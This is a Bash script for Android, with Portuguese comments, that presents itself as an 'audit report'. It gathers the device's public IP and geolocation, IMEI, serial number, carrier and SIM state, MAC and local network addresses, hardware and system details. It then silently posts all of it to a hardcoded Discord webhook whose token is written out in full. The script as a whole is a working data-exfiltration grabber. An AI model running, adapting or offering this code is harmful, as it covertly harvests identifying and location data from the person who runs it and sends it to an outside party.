
#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

# 1. LOCALIZACAO E REDE MUNDIAL (IP-API COMPLETO)
PUB_IP=$(curl -s --connect-timeout 5 https://ifconfig.me || echo "0.0.0.0")
LOC_DATA=$(curl -s "http://ip-api.com" | tr -d '"{}' | tr ',' '\n' | sed 's/^[ \t]*//' || echo "Erro de Localizacao")

# 2. DADOS DA OPERADORA E RÁDIO
OPERADORA=$(getprop gsm.operator.alpha || echo "N/A")
SIM_STATE=$(getprop gsm.sim.state || echo "N/A")
IMEI_SV=$(getprop ro.ril.miui.imei0 || getprop ro.ril.oem.imei1 || echo "Bloqueado")

# 3. HARDWARE DETALHADO
MODEL=$(getprop ro.product.model)
BRAND=$(getprop ro.product.brand)
SERIAL=$(getprop ro.serialno || echo "Oculto")
BOARD=$(getprop ro.product.board)
CPU_ABI=$(getprop ro.product.cpu.abi)
CPU_HARD=$(getprop ro.hardware)
MEM_TOTAL=$(free -h | awk '/Mem:/ {print $2}')
MEM_FREE=$(free -h | awk '/Mem:/ {print $4}')

# 4. SISTEMA E SEGURANCA
ANDROID_VER=$(getprop ro.build.version.release)
SDK_VER=$(getprop ro.build.version.sdk)
SECURITY_PATCH=$(getprop ro.build.version.security_patch)
KERNEL=$(uname -a)
UPTIME=$(uptime -p)

# 5. REDE INTERNA E WIFI
LOCAL_IPS=$(ip addr show | grep 'inet ' | awk '{print $2}' | tr '\n' ' ' | sed 's/ $//')
MAC_ADDR=$(ip link show | grep 'link/ether' | awk '{print $2}' | head -n 1 || echo "Privado")
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -n 1)
DNS=$(getprop net.dns1)

# 6. ARMAZENAMENTO E PARTICÕES
DISK_USAGE=$(df -h /data /system /cache 2>/dev/null | awk 'NR>1 {print $1 ":" $4 "/" $2}' | tr '\n' ' ')

# 7. MONTAGEM DO PAYLOAD (STRING UNICA PARA EVITAR QUEBRA DE JSON)
PAYLOAD=$(cat <<EOF
{
  "content": "RELATORIO DE AUDITORIA MAXIMA ANDROID",
  "embeds": [{
    "title": "DADOS TÉCNICOS COMPLETOS",
    "color": 0,
    "fields": [
      {"name": "Localizacao e IP", "value": "IP: $PUB_IP\n$LOC_DATA", "inline": false},
      {"name": "Dispositivo", "value": "Marca: $BRAND\nModelo: $MODEL\nSerial: $SERIAL\nBoard: $BOARD\nCPU ABI: $CPU_ABI\nHardware: $CPU_HARD", "inline": false},
      {"name": "Software", "value": "Android: $ANDROID_VER\nSDK: $SDK_VER\nPatch: $SECURITY_PATCH\nKernel: $KERNEL\nUptime: $UPTIME", "inline": false},
      {"name": "Conectividade", "value": "Operadora: $OPERADORA\nSIM: $SIM_STATE\nIPs: $LOCAL_IPS\nMAC: $MAC_ADDR\nGW: $GATEWAY\nDNS: $DNS", "inline": false},
      {"name": "Hardware e Discos", "value": "RAM: $MEM_FREE de $MEM_TOTAL\nParticoes: $DISK_USAGE", "inline": false}
    ]
  }]
}
EOF
)

# 8. ENVIO FINAL
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
